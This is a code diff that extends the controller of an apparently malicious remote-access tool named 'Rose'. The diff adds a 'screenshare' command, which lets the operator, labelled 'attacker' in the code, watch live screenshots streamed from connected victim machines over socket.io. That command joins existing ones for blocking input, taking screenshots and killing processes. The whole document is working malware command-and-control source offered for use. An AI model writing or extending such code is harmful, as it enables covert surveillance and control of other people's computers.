@@ -9,6 +9,8 @@ import webbrowser
 
 import json
 
+import threading
+
 __version__ = "1.0"
 
 #with open("config.json", "r") as f:
@@ -29,6 +31,59 @@ o    o   O   o `Ooo. OooO'
 O     O  o   O     O O
 O      o `OoO' `OoO' `OoO'
 """
+
+def start_attacker_screenshare():
+    def to_execute():
+        import eventlet
+        import socketio
+        from threading import Thread
+        from zlib import decompress
+
+        from mss import mss
+        import pygame 
+
+        WIDTH = 1900
+        HEIGHT = 1000
+
+        _sio = socketio.Client()
+        pygame.init()
+        screen = pygame.display.set_mode((WIDTH, HEIGHT))
+        clock = pygame.time.Clock()
+        
+        pygame.display.set_caption('Rose - Screenshare client - made by xpierroz')
+
+
+        @_sio.event
+        def connect():
+            print('screenshare attacker client connected')
+            _sio.emit("iam_attacker")
+
+        _sio.connect(server_url)
+
+        done = False
+        while not done:
+            for event in pygame.event.get():
+                if event.type == pygame.QUIT:
+                    pygame.quit()
+
+            @_sio.event
+            def receiving_screenshot(data):
+                #msize_len = data['data']['size_len']
+                #msize_bytes = data['data']['size_bytes']
+                mpixels = data['data']['pixels']
+                pixels = decompress(mpixels)
+
+                # Create the Surface from raw pixels
+                img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')
+
+                # Display the picture
+                screen.blit(img, (0, 0))
+                pygame.display.flip()
+                clock.tick(60)
+                
+    t = threading.Thread(target=to_execute)
+    t.run()
+
 class Connected():
     def __init__(self):
         self.client_connected = 0
@@ -95,6 +150,8 @@ class Serv():
                             }
                         }
                     )
+                    if cmd == "screenshare":
+                        start_attacker_screenshare()
                     print(Colorate.Horizontal(Colors.green_to_white, f'    .$ Command Sent to {sid}'))
                 except Exception as e: #Print command failed in red
                     print(Colorate.Horizontal(Colors.red_to_white, f'    .$ Command Failed to {sid}'))
@@ -116,7 +173,6 @@ class Serv():
         @self.sio.event
         def auth(data):
             print(f"Data Received {data}")
-
 
         @self.sio.event
         def disconnect():
@@ -144,7 +200,8 @@ class Command():
             'blockinput',
             'unblockinput',
             'screenshot',
-            'kill'
+            'kill',
+            'screenshare'
         ]
 
     def is_valid(self, command):
